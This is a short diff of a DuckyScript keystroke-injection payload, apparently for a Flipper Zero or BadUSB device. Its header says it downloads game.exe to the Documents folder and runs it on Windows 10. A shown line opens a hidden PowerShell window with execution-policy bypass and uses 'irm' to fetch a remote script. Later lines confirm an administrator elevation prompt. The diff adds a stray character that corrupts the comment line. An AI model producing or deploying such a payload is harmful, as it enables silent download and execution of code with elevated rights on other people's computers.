@@ -1,4 +1,4 @@
-REM Title: 3noc1d1c4
+lREM Title: 3noc1d1c4
 REM Author: 3noc1d1c4
 REM Description: this script downloads game.exe to documents/game.exe and runs game.exe from the folder. Ps1 uploaded in same folder for ease of modification.
 REM Target: Windows 10
@@ -11,7 +11,7 @@ STRING powershell -NoP -Ep Bypass -W H -C irm https://github.com/knoxoxen/flippe
 CTRL-SHIFT ENTER
 DELAY 10000
 ALT y
-
+DELAY 10000
 REM some setup for dukie script
 DEFAULT_DELAY 100
 
